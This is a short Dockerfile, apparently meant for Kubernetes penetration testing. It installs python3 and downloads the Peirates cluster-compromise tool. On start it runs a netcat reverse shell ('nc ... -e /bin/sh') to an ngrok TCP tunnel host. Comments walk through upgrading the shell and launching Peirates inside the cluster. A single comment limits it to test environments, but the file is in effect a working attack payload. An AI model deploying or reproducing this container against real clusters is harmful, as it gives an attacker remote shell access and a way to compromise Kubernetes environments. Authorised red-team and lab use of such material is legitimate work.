FROM bash:latest
# Don't use outside of test environments
# Python3 to upgrade TTY
RUN apk add --update python3
# Peirates to compromise K8s internally
RUN wget https://github.com/inguardians/peirates/releases/download/v1.1.16/peirates-linux-amd64.tar.xz -O /tmp/peirates.tar.xz
# Change part 2 and 3 to your own ngrok TCP tunnel
CMD ["nc","4.tcp.eu.ngrok.io","19101","-e","/bin/sh"]
# Once shell is obtained, upgrade shell with python3 -c "import pty;pty.spawn('/usr/local/bin/bash')"
# Go to /tmp
# tar -xf peirates.tar.xz
# rm *.xf
# cd p*
# ./peirates
